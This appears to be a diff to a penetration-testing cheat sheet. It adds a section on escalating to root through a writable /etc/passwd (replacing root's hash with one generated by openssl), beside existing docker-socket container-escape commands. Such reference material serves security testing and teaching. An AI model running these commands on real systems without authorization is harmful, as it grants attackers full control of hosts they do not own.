@@ -471,6 +471,12 @@ $ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /
 $ docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
 
+### Writable /etc/passwd
+
+Replace root password hash
+1. Kali: generate a password `openssl passwd hacker123` and obtain a password hash.
+2. Target: replace root password `x` in `/etc/passwd` file with password hash i.e. `root:<has>:0:0:----`
+
 
 ## Windows Privilege Escalation
 
